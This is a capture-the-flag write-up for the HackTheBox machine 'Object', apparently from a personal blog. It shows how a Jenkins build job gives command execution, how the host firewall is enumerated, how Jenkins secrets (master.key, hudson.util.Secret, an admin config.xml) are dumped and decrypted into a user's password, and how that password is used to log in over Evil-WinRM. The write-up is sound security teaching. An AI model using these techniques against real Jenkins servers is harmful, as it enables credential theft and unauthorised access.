---
title: HTB: Object
url: https://0xdf.gitlab.io/2022/02/28/htb-object.html
date: 2022-02-28T10:00:00+00:00
difficulty: Hard [40]
os: Windows
tags: hackthebox, htb-object, ctf, uni-ctf, nmap, iis, windows, feroxbuster, wfuzz, jenkins, cicd, firewall, windows-firewall, jenkins-credential-decryptor, pwn-jenkins, evil-winrm, crackmapexec, bloodhound, sharphound, active-directory, github, forcechangepassword, genericwrite, writeowner, logon-script, powerview, scheduled-task, powershell, htb-jeeves, oscp-like-v2
---

![Object](https://0xdfimages.gitlab.io/img/object-cover.png)

Object was tricky for a CTF box, from the HackTheBox University CTF in 2021. I’ll start with access to a Jenkins server where I can create a pipeline (or job), but I don’t have permissions to manually tell it to build. I’ll show two ways to get it to build anyway, providing execution. I’ll enumerate the firewall to see that no TCP traffic can reach outbound, and eventually find credentials and get a connection over WinRM. From there, it’s three hops of Active Directory abuse, all made clear by BloodHound. First a password change, then abusing logon scripts, and finally some group privileges. In Beyond Root, I’ll enumerate the automation that ran the logon scripts as one of the users.

## Box Info

| Name | [Object](https://hackthebox.com/machines/object)  [Object](https://hackthebox.com/machines/object) [Play on HackTheBox](https://hackthebox.com/machines/object) |
| --- | --- |
| Release Date | [28 Feb 2022](https://twitter.com/hackthebox_eu/status/1498364892419706884) |
| Retire Date | 28 Feb 2022 |
| OS | Windows Windows |
| Base Points | Hard [40] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creator | [MrR3boot MrR3boot](https://app.hackthebox.com/users/13531) |

## Recon

### nmap

`nmap` finds three open TCP ports, WinRM (22) and two HTTP (80, 8080):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.132
Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-26 21:40 UTC
Nmap scan report for 10.10.11.132
Host is up (0.093s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 13.55 seconds
oxdf@hacky$ nmap -p 80,5985,8080 -sCV -oA scans/nmap-tcpscripts 10.10.11.132
Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-26 21:41 UTC
Nmap scan report for 10.10.11.132
Host is up (0.091s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Mega Engines
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp open  http    Jetty 9.4.43.v20210629
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.43.v20210629)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.99 seconds

```

The [IIS version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions) suggests Win10+/Server 2016+. It’s interesting that the 80 HTTP server is running on IIS, but the 8080 is running on Jetty.

### Website - TCP 80

#### Site

The site is for Mega Engines:

![image-20220226165134417](https://0xdfimages.gitlab.io/img/image-20220226165134417.png)

There’s an email address and domain reference, so I’ll add `object.htb` to my `/etc/hosts` file. Visiting the page by that domain instead of the IP returns the same page.

The only link on the page for the “automation” server leads to `http://object.htb:8080/`.

#### Tech Stack

The headers show IIS version 10.0, and not much else:

```

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Tue, 26 Oct 2021 06:21:32 GMT
Accept-Ranges: bytes
ETag: "0fe0b831cad71:0"
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
Date: Sat, 26 Feb 2022 21:55:01 GMT
Connection: close
Content-Length: 29932

```

Visiting `http://object.htb/index.html` returns the same index, so that doesn’t give much information about the site either. It could very well be a static site hosted on IIS.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, which finds *nothing*:

```

oxdf@hacky$ feroxbuster -u http://object.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://object.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
[####################] - 59s    29999/29999   0s      found:0       errors:0      
[####################] - 58s    29999/29999   508/s   http://object.htb 

```

### Virtual Host Fuzz

Given the use of the domain `object.htb`, I’ll fuzz for other subdomains, but not find any:

```

oxdf@hacky$ wfuzz -u http://object.htb -H 'Host: FUZZ.object.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 29932
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://object.htb/
Total requests: 4989

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

Total time: 50.26777
Processed Requests: 4989
Filtered Requests: 4989
Requests/sec.: 99.24847

```

### Jenkins - TCP 8080

#### Site

Visiting `http://object.htb:8080` redirects to `http://object.htb:8080/login?from=%2F`, which is a login form for Jenkins:

![image-20220226165731219](https://0xdfimages.gitlab.io/img/image-20220226165731219.png)

[Jenkins](https://www.jenkins.io/) is an open source automation server, which was doing things kind of like GitHub Actions and Gitlab Pipelines before those existed. I first saw Jenkins on HackTheBox in the Jeeves box (one of the few I’ve yet to do a writeup for).

I couldn’t find any login bypass vulnerabilities, and I don’t have creds, so I’ll create an account. On filling out the form, I’m logged in:

![image-20220226165955672](https://0xdfimages.gitlab.io/img/image-20220226165955672.png)

I’ll note the version, Jenkins 2.317 in the footer. Clicking “the top page” leads to:

![image-20220227062856991](https://0xdfimages.gitlab.io/img/image-20220227062856991.png)

There’s a lot to explore in here. “People” shows that it’s just me and admin with accounts:

![image-20220227062407251](https://0xdfimages.gitlab.io/img/image-20220227062407251.png)

Clicking on myself (or from the link at the top right next to “log out”) leads to a section about my user:

![image-20220227113408339](https://0xdfimages.gitlab.io/img/image-20220227113408339.png)

Under “Configure”, there’s a menu that includes API tokens (I’ll use this in a bit):

[![image-20220227113620372](https://0xdfimages.gitlab.io/img/image-20220227113620372.png)](https://0xdfimages.gitlab.io/img/image-20220227113620372.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220227113620372.png)

Interested in understanding my privileges, some Googling the led to pages like [this](https://www.toolsqa.com/jenkins/jenkins-user-management/). I’ll try visiting `/manage`, but get denied:

![image-20220227062654038](https://0xdfimages.gitlab.io/img/image-20220227062654038.png)

#### Vulnerabilities

Given that the page footers shows a version number (2.317). I did find one Metasploit exploit based on work from Orange Tsai (so it’s legit), but it requires a Pipeline Groovy Plugin. As far as I know (correct me on Twitter if I’m wrong), Groovy is installed by default, but used in the Script Console (which according to [the docs](https://www.jenkins.io/doc/book/managing/script-console/) is at `/script`), which I don’t have permission to access:

![image-20220227131730232](https://0xdfimages.gitlab.io/img/image-20220227131730232.png)

I did fire up MSF and try to get the exploit to work, but I was unsuccessful.

## Shell as oliver

### Create a Job

Back at the top page, the “Create a job” link might have potential (“New Item” in the bar on the left goes to the same place). If I can run some malicious code in a job, I could get execution.

On the first screen I’ll give the job a name (“0xdf’s job”) and select “Freestyle project”. The next page has all the configuration for the job:

[![image-20220227064107633](https://0xdfimages.gitlab.io/img/image-20220227064107633.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220227064107633.png)

The important part is “Add build step”, as that describes what gets run. Clicking on it shows the options:

![image-20220227064317951](https://0xdfimages.gitlab.io/img/image-20220227064317951.png)

“Execute shell” is for Linux systems, so I’ll pick “Execute Windows batch command”, and start with something very simple:

![image-20220227064748795](https://0xdfimages.gitlab.io/img/image-20220227064748795.png)

I’ll click “Save”, which returns me to the main dashboard.

### Run Job

#### Build now Fail

I fully expected there to be somewhere to click to run the job, but it isn’t obvious:

[![image-20220227065019956](https://0xdfimages.gitlab.io/img/image-20220227065019956.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220227065019956.png)

Some Googling suggests there should be a “Build now” button in the sidebar. [This StackOverflow answer](https://stackoverflow.com/a/41108207) suggests it’s not there because either my project is disabled (which seems unlikely as the “Disable project” button is in the screen shot above), or I don’t have permissions (which seems possible). I’ll need another (I’ll find two) way to start the job.

#### Method 1: Schedule

Clicking the “Configure” link in the sidebar leads back to the settings for the job, where I’ll look more closely at the “Build Triggers” section:

![image-20220227065323109](https://0xdfimages.gitlab.io/img/image-20220227065323109.png)

“Build periodically” seems promising. I’ll check that box, which gives a empty text field. Jenkins uses a schedule system [similar to cron](https://www.lenar.io/jenkins-schedule-build-periodically/). I’ll enter “\* \* \* \* \*”, and it warns me that this will run every minute:

![image-20220227065621251](https://0xdfimages.gitlab.io/img/image-20220227065621251.png)

I’ll save and after a minute, refresh the page, and there’s a build in the history:

![image-20220227065719113](https://0xdfimages.gitlab.io/img/image-20220227065719113.png)

Hovering over the “#1” there’s a dropdown:

![image-20220227065741004](https://0xdfimages.gitlab.io/img/image-20220227065741004.png)

“Console Output” shows the job ran:

![image-20220227065815838](https://0xdfimages.gitlab.io/img/image-20220227065815838.png)

#### Method 2: Trigger Remotely

Running different commands waiting one minute between each one is a bit exhausting. I’ll disable the scheduled trigger. Looking at the other options for “Build Triggers”, “Trigger builds remotely (e.g., from scripts)” seems interesting. Checking it expands out asking for an “Authentication Token”:

![image-20220227113123491](https://0xdfimages.gitlab.io/img/image-20220227113123491.png)

I can try just adding a string as the token (say “TestToken”) and requesting the endpoint they give, but it doesn’t work:

```

oxdf@hacky$ curl "http://object.htb:8080/job/0xdf's%20job/build?token=TestToken"
<html><head><meta http-equiv='refresh' content='1;url=/login?from=%2Fjob%2F0xdf%27s%2520job%2Fbuild%3Ftoken%3DTestToken'/><script>window.location.replace('/login?from=%2Fjob%2F0xdf%27s%2520job%2Fbuild%3Ftoken%3DTestToken');</script></head><body style='background-color:white; color:white;'>

Authentication required
<!--
-->

</body></html>    

```

Back during enumeration I found where I could create API tokens in my profile. I’ll head there and click “Add new Token”:

![image-20220227113733612](https://0xdfimages.gitlab.io/img/image-20220227113733612.png)

I’ll name it `0xdfToken` and click generate:

![image-20220227113810458](https://0xdfimages.gitlab.io/img/image-20220227113810458.png)

I’ll also update the batch script with the job so that it’s clear why it triggered:

![image-20220227124131900](https://0xdfimages.gitlab.io/img/image-20220227124131900.png)

[This post](https://www.theserverside.com/blog/Coffee-Talk-Java-News-Stories-and-Opinions/Trigger-Jenkins-Builds-Remotely-Example-403-Error-Fix) shows how to actually trigger the job. I’ll need to use the url of the form:

```

http://[username]:[token]@[host]/job/[job name]/build?token=[token name]

```

So for me, that’s:

```

oxdf@hacky$ curl "http://0xdf:1176e6f7ba9fdf90c7ec7dba8c413cda89@object.htb:8080/job/0xdf's%20job/build?token=0xdfToken"

```

There’s no response from the server, but the job triggers, and a moment later there’s console output:

![image-20220227124212845](https://0xdfimages.gitlab.io/img/image-20220227124212845.png)

### Firewall Enumeration

#### Identify Outbound Block

I’ll try a handful of things to see about getting a reverse shell on the host. First, I’ll try having PowerShell use `Invoke-WebRequest` (or `iwr`) to download a PowerShell script:

![image-20220227124609688](https://0xdfimages.gitlab.io/img/image-20220227124609688.png)

On triggering the job, there’s no connection to my listening Python webserver (`python3 -m http.server 80`). The job has a red X next to it to indicate failure.

![image-20220227124735630](https://0xdfimages.gitlab.io/img/image-20220227124735630.png)

#### Find Blocking Rule

This feels very much like a firewall preventing outbound connections.

I’ll use the fact that I can see results from commands run to look at the firewall using `Get-NetFirewallRule`. Just giving this command `-All` will return a *ton* of stuff, so I’ll limit with the following arguments (based on the [docs](https://docs.microsoft.com/en-us/powershell/module/netsecurity/get-netfirewallrule?view=windowsserver2022-ps)):
- `-Direction Outbound` - limit to outbound rules since that’s where I’m having issues
- `-Action Block` - limit to rules that block traffic
- `-Enabled True` - don’t show the large set of rules that are present but not enabled

This returns a single result:

```

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\0xdf's job>powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block 

Name                  : {D6399A8B-5E04-458F-AA68-62F64A4F1F43}
DisplayName           : BlockOutboundDC
Description           : 
DisplayGroup          : 
Group                 : 
Enabled               : True
Profile               : Any
Platform              : {}
Direction             : Outbound
Action                : Block
EdgeTraversalPolicy   : Block
LooseSourceMapping    : False
LocalOnlyMapping      : False
Owner                 : 
PrimaryStatus         : OK
Status                : The rule was parsed successfully from the store. (65536)
EnforcementStatus     : NotApplicable
PolicyStoreSource     : PersistentStore
PolicyStoreSourceType : Local

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\0xdf's job>exit 0 
Finished: SUCCESS

```

The name implies it’s blocking outbound, but I can see the actual ports by piping this result into `Get-NetFirewallPortFilter`. [This post](https://itluke.online/2018/11/27/how-to-display-firewall-rule-ports-with-powershell/) has a nice bit of code at the bottom which I’ll tweak a bit to print what I want:

```

powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block |
Format-Table -Property 
DisplayName, 
@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},
@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},
@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},
Enabled,
Profile,
Direction,
Action"

```

I’ll have to remove the newlines to get it to work in Jenkins, and make sure the entire PowerShell command is in `""`. When I run this thought Jenkins it returns:

```

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\test>powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property DisplayName,@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}},@{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile,Direction,Action" 

DisplayName     Protocol LocalPort RemotePort RemoteAddress Enabled Profile Direction Action
-----------     -------- --------- ---------- ------------- ------- ------- --------- ------
BlockOutboundDC TCP      Any       Any        Any              True     Any  Outbound  Block

```

This rule is blocking all outbound TCP.

#### Look for Exceptions

I’ll switch the `-Action` to `Allow` to look for exceptions:

```

powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow

```

While there’s a good size list returned, none of them end up being useful. Many are for specific programs, or else the blocking rule out prioritizes them. I wasn’t able to get anything outbound except for ICMP. On setting the command to `cmd /c ping 10.10.14.6` and triggering, it does show up at a listening `tcpdump`:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
17:43:49.158637 IP 10.10.11.132 > 10.10.14.6: ICMP echo request, id 3, seq 27762, length 40
17:43:49.158711 IP 10.10.14.6 > 10.10.11.132: ICMP echo reply, id 3, seq 27762, length 40
17:43:50.166486 IP 10.10.11.132 > 10.10.14.6: ICMP echo request, id 3, seq 27765, length 40
17:43:50.166516 IP 10.10.14.6 > 10.10.11.132: ICMP echo reply, id 3, seq 27765, length 40
17:43:51.182067 IP 10.10.11.132 > 10.10.14.6: ICMP echo request, id 3, seq 27768, length 40
17:43:51.182096 IP 10.10.14.6 > 10.10.11.132: ICMP echo reply, id 3, seq 27768, length 40
17:43:52.197333 IP 10.10.11.132 > 10.10.14.6: ICMP echo request, id 3, seq 27771, length 40
17:43:52.197371 IP 10.10.14.6 > 10.10.11.132: ICMP echo reply, id 3, seq 27771, length 40

```

### Jenkins Enumeration

#### Look for Creds

I’ll look for the creds associated with the admin account. This could get more access in Jenkins, or perhaps give WinRM access to the host. [This article](https://blog.searce.com/jenkins-change-the-forgotten-password-525169ba1c34) talks about how each user’s information is stored in a `config.xml` file. [This article](https://www.jenkins.io/doc/developer/security/secrets/) talks about the encryption used to store secrets.
*Note: I’m still running commands by editing the job, triggering it, and then checking the console output. For the sake of readability, I’ll just be showing the output from this point on unless there’s a reason to show it.*

Looking at the previous console returns, it’s clear the job is running from `C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\0xdf's job`. Looking up a couple directories:

```

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\0xdf's job>powershell -c ls ..\.. 

    Directory: C:\Users\oliver\AppData\Local\Jenkins\.jenkins

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        2/27/2022   3:49 AM                jobs                                                                  
d-----       10/20/2021  10:19 PM                logs                                                                  
d-----       10/20/2021  10:08 PM                nodes                                                                 
d-----       10/20/2021  10:12 PM                plugins                                                               
d-----       10/20/2021  10:26 PM                secrets                                                               
d-----       10/25/2021  10:31 PM                updates                                                               
d-----       10/20/2021  10:08 PM                userContent                                                           
d-----        2/26/2022   1:59 PM                users                                                                 
d-----       10/20/2021  10:13 PM                workflow-libs                                                         
d-----        2/27/2022   3:33 AM                workspace                                                             
-a----        2/26/2022   1:39 PM              0 .lastStarted                                                          
-a----        2/27/2022   9:58 AM             41 .owner                                                                
-a----        2/26/2022   1:39 PM           2505 config.xml                                                            
-a----        2/26/2022   1:39 PM            156 hudson.model.UpdateCenter.xml                                         
-a----       10/20/2021  10:13 PM            375 hudson.plugins.git.GitTool.xml                                        
-a----       10/20/2021  10:08 PM           1712 identity.key.enc                                                      
-a----        2/26/2022   1:39 PM              5 jenkins.install.InstallUtil.lastExecVersion                           
-a----       10/20/2021  10:14 PM              5 jenkins.install.UpgradeWizard.state                                   
-a----       10/20/2021  10:14 PM            179 jenkins.model.JenkinsLocationConfiguration.xml                        
-a----       10/20/2021  10:21 PM            357 jenkins.security.apitoken.ApiTokenPropertyConfiguration.xml           
-a----       10/20/2021  10:21 PM            169 jenkins.security.QueueItemAuthenticatorConfiguration.xml              
-a----       10/20/2021  10:21 PM            162 jenkins.security.UpdateSiteWarningsConfiguration.xml                  
-a----       10/20/2021  10:08 PM            171 jenkins.telemetry.Correlator.xml                                      
-a----        2/26/2022   1:39 PM            907 nodeMonitors.xml                                                      
-a----        2/27/2022  10:06 AM            856 queue.xml                                                             
-a----       10/20/2021  10:28 PM            129 queue.xml.bak                                                         
-a----       10/20/2021  10:08 PM             64 secret.key                                                            
-a----       10/20/2021  10:08 PM              0 secret.key.not-so-secret

```

The user information is stored in `/users/`:

```

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\0xdf's job>powershell -c ls ..\..\users\ 

    Directory: C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/27/2022  10:30 AM                0xdf_4936803374376763548
d-----       10/21/2021   2:22 AM                admin_17207690984073220035
-a----        2/26/2022   1:59 PM            402 users.xml

```

In that admin directory, there’s a `config.xml`:

```

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\0xdf's job>powershell -c ls ..\..\users\admin_17207690984073220035 

    Directory: C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\admin_17207690984073220035

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       10/21/2021   2:22 AM           3186 config.xml 

```

I’ll dump that file and save it to my local workstation:

```

<?xml version='1.1' encoding='UTF-8'?>
<user>
  <version>10</version>
  <id>admin</id>
  <fullName>admin</fullName>
  <properties>
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@2.6.1">
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash">
        <entry>
          <com.cloudbees.plugins.credentials.domains.Domain>
            <specifications/>
          </com.cloudbees.plugins.credentials.domains.Domain>
          <java.util.concurrent.CopyOnWriteArrayList>
            <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
              <id>320a60b9-1e5c-4399-8afe-44466c9cde9e</id>
              <description></description>
              <username>oliver</username>
              <password>{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}</password>
              <usernameSecret>false</usernameSecret>
            </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
          </java.util.concurrent.CopyOnWriteArrayList>
        </entry>
      </domainCredentialsMap>
    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>
    <hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin="email-ext@2.84">
      <triggers/>
    </hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty>
    <hudson.model.MyViewsProperty>
      <views>
        <hudson.model.AllView>
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
          <name>all</name>
          <filterExecutors>false</filterExecutors>
          <filterQueue>false</filterQueue>
          <properties class="hudson.model.View$PropertyList"/>
        </hudson.model.AllView>
      </views>
    </hudson.model.MyViewsProperty>
    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.3.5">
      <providerId>default</providerId>
    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>
    <hudson.model.PaneStatusProperties>
      <collapsed/>
    </hudson.model.PaneStatusProperties>
    <jenkins.security.seed.UserSeedProperty>
      <seed>ea75b5bd80e4763e</seed>
    </jenkins.security.seed.UserSeedProperty>
    <hudson.search.UserSearchProperty>
      <insensitiveSearch>true</insensitiveSearch>
    </hudson.search.UserSearchProperty>
    <hudson.model.TimeZoneProperty/>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <passwordHash>#jbcrypt:$2a$10$q17aCNxgciQt8S246U4ZauOccOY7wlkDih9b/0j4IVjZsdjUNAPoW</passwordHash>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
    <hudson.tasks.Mailer_-UserProperty plugin="mailer@1.34">
      <emailAddress>admin@object.local</emailAddress>
    </hudson.tasks.Mailer_-UserProperty>
    <jenkins.security.ApiTokenProperty>
      <tokenStore>
        <tokenList/>
      </tokenStore>
    </jenkins.security.ApiTokenProperty>
    <jenkins.security.LastGrantedAuthoritiesProperty>
      <roles>
        <string>authenticated</string>
      </roles>
      <timestamp>1634793332195</timestamp>
    </jenkins.security.LastGrantedAuthoritiesProperty>
  </properties>
</user>

```

There’s both a hash and an encrypted password.

#### Decrypt Password

I could try to brute force the hash, but decrypting the password will be easier. Most of the references that will come up on Google (like [this one](https://sites.google.com/site/xiangyangsite/home/technical-tips/software-development/jenkins/decrypting-jenkins-passwords)) show how to do this through the script console (`/script`), but as I showed above, I don’t have access to that.

I found two repos on Github that had methods for decrypting user passwords stored on Jenkins. [This one](https://github.com/hoto/jenkins-credentials-decryptor) is written in Go, and [this one](https://github.com/gquere/pwn_jenkins) has a ton of Python scripts for pentesting Jenkins.

Both require the `config.xml`, as well as `master.key` and `hudson.util.Secret`, but from `/secrets/`:

```

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\0xdf's job>powershell -c ls ..\..\secrets 

    Directory: C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       10/20/2021  10:08 PM                filepath-filters.d                                                    
d-----       10/20/2021  10:08 PM                whitelisted-callables.d                                               
-a----       10/20/2021  10:26 PM            272 hudson.console.AnnotatedLargeText.consoleAnnotator                    
-a----       10/20/2021  10:26 PM             32 hudson.model.Job.serverCookie                                         
-a----       10/20/2021  10:15 PM            272 hudson.util.Secret                                                    
-a----       10/20/2021  10:08 PM             32 jenkins.model.Jenkins.crumbSalt                                       
-a----       10/20/2021  10:08 PM            256 master.key                                                            
-a----       10/20/2021  10:08 PM            272 org.jenkinsci.main.modules.instance_identity.InstanceIdentity.KEY     
-a----       10/20/2021  10:21 PM              5 slave-to-master-security-kill-switch  

```

`master.key` looks like it’s stored in hex:

```

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\0xdf's job>powershell -c cat ..\..\secrets\master.key 
f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19

```

I can verify I got the full thing by making sure it’s the same length, 256 bytes:

```

oxdf@hacky$ wc -c master.key 
256 master.key

```

`hudson.util.Secret` looks like a binary file:

![image-20220228165017916](https://0xdfimages.gitlab.io/img/image-20220228165017916.png)

I’ll use PowerShell to base64 [encode it](https://docs.microsoft.com/en-us/previous-versions/troubleshoot/winautomation/process-development-tips/text-manipulation/convert-file-to-base64-string-format):

```

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\0xdf's job>powershell -c [convert]::ToBase64String((cat ..\..\secrets\hudson.util.Secret -Encoding byte)) 
gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=

```

Now I can copy that string and `echo` it into `base64 -d` on my local system to save it to a file.

Downloading the Go binary from jenkins-credential-decryptor like in [these instructions](https://github.com/hoto/jenkins-credentials-decryptor#run-using-a-binary) works great:

```

oxdf@hacky$ curl -L \
>   "https://github.com/hoto/jenkins-credentials-decryptor/releases/download/1.2.0/jenkins-credentials-decryptor_1.2.0_$(uname -s)_$(uname -m)" \
>    -o jenkins-credentials-decryptor
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   687  100   687    0     0   5088      0 --:--:-- --:--:-- --:--:--  5088
100 2336k  100 2336k    0     0  4382k      0 --:--:-- --:--:-- --:--:-- 10.3M
oxdf@hacky$ chmod +x jenkins-credentials-decryptor
oxdf@hacky$ ./jenkins-credentials-decryptor 
Please provide all required flags.

Usage:

  jenkins-credentials-decryptor \
    -m master.key \
    -s hudson.util.Secret \
    -c credentials.xml \
    -o json

Flags:
  -c string
        (required) credentials.xml file location
  -m string
        (required) master.key file location
  -o string
        (optional) output format [json|text] (default "json")
  -s string
        (required) hudson.util.Secret file location
  -version
        (optional) show version

oxdf@hacky$ ./jenkins-credentials-decryptor -m master.key -s hudson.util.Secret -c config.xml 
[
  {
    "id": "320a60b9-1e5c-4399-8afe-44466c9cde9e",
    "password": "c1cdfun_d2434\u0003\u0003\u0003",
    "username": "oliver"
  }
]

```

The pwn\_jenkins [Python script](https://github.com/gquere/pwn_jenkins) works as well:

```

oxdf@hacky$ wget https://raw.githubusercontent.com/gquere/pwn_jenkins/master/offline_decryption/jenkins_offline_decrypt.py
--2022-02-27 18:47:56--  https://raw.githubusercontent.com/gquere/pwn_jenkins/master/offline_decryption/jenkins_offline_decrypt.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 2606:50c0:8000::154, 2606:50c0:8001::154, 2606:50c0:8002::154, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6875 (6.7K) [text/plain]
Saving to: ‘jenkins_offline_decrypt.py’

jenkins_offline_decrypt.py                           100%[=====================================================================================================================>]   6.71K  --.-KB/s    in 0s      

2022-02-27 18:47:57 (14.0 MB/s) - ‘jenkins_offline_decrypt.py’ saved [6875/6875]

oxdf@hacky$ python jenkins_offline_decrypt.py 
Usage:
        jenkins_offline_decrypt.py <jenkins_base_path>
or:
        jenkins_offline_decrypt.py <master.key> <hudson.util.Secret> [credentials.xml]
or:
        jenkins_offline_decrypt.py -i <path> (interactive mode)
oxdf@hacky$ python jenkins_offline_decrypt.py master.key hudson.util.Secret config.xml 
c1cdfun_d2434

```

Either way, the password is “c1cdfun\_d2434”.

### WinRM

Before logging into Jenkins, I’ll try this password over [Evil-WinRM](https://github.com/Hackplayers/evil-winrm):

```

oxdf@hacky$ evil-winrm -i 10.10.11.132 -u oliver -p c1cdfun_d2434

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\oliver\Documents>

```

It works!

I can grab `user.txt` as well:

```
*Evil-WinRM* PS C:\Users\oliver\desktop> type user.txt
30a27c61************************

```

## Shell as smith

### Host Enumeration

There’s not much else in oliver’s home directory. There are two other non-administrator users with home directories, maria and smith:

```
*Evil-WinRM* PS C:\Users> ls

    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/10/2021   3:20 AM                Administrator
